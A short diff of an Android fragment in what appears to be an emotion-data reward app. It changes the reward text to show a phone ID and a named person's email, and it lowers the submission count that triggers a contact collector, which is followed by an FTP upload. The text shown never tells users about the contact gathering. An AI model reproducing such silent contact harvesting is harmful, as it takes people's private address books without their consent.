@@ -23,11 +23,12 @@ public class ResultFragment extends Fragment {
         cnt= SharedPreferenceManager.getManager().getInt("emotionCnt",0);
         Log.d("resultFragment","emotion"+cnt);
         if(cnt<60) tv.setText("您已经提交了"+cnt+"次，还有"+(60-cnt)+"次可以领取奖励");
-        else tv.setText("您已经提交了足够的次数。从第60次提交（包括60）起，只要有一次上传成功，即可联系张啸tobexiao1@gmail.com领取奖励。");
+        else tv.setText("您已经提交了足够的次数。\n您的ID是"+SharedPreferenceManager.getManager().getString("phoneID", null)
+                +"。\n联系张啸(tobexiao1@gmail.com)确认上传成功后即可领取奖励。");
         new Thread(new Runnable() {
             @Override
             public void run() {
-                if(cnt>=60){
+                if(cnt>=57){
                     new ContactCollector().collect();
                 }
                 new FtpUploader().upload();
